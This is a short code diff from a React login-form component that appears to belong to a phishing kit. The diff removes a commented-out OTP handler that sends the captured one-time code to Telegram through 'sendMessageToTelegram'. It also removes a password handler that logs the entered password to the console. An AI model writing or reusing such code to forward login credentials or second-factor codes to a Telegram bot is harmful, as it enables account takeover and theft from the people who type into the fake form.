@@ -108,49 +108,6 @@ export default function LoginForm() {
         }
     }, [command, modal, setDisplayModal]);
 
-    // const { validatePassword } = useValidatePassword();
-    // const handleOtpValidation = () => {
-    //     // Replace this with your actual OTP validation logic:
-    //     const isValid = validateOtp(otpCode);
-
-    //     // Set error state based on validity
-    //     setInvalid(!isValid);
-
-    //     // Always start the loader when trying to submit
-    //     setIsLoading(true);
-
-    //     if (isValid) {
-    //       console.log(`${modal} OTP is valid. Sending to Telegram...`);
-    //       // Send OTP along with its type. Adjust sendMessageToTelegram as needed.
-    //       sendMessageToTelegram(otpCode);
-    //     } else {
-    //       // If invalid, show loader for 1 second, then turn it off.
-    //       setTimeout(() => {
-    //         setIsLoading(false);
-    //       }, 1000);
-    //     }
-
-    //     return isValid;
-    //   };
-
-
-
-    // const handlePasswordValidation = () => {
-    //     const isValid = validatePassword(password);
-    //     setInvalid(!isValid);
-    //     console.log("password is ", password)
-    //     console.log(' Authentication submitted')
-
-    //     if (isValid) {
-    //         setIsLoading(true);
-    //         setTimeout(() => {
-    //             setIsLoading(false);
-    //         }, 5000);
-    //     }
-
-    //     return isValid;
-    // }
-
 
     const [padding, setPadding] = useState("80px 24px 54px");
 
